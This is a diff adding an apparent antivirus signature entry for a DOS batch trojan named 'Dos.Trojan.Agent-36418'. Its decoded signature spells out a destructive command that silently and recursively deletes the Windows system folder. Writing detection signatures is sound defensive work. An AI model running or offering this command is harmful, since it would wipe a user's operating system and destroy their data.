@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36418
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off cd\ rmdir /s /q c:\windows cls exit 
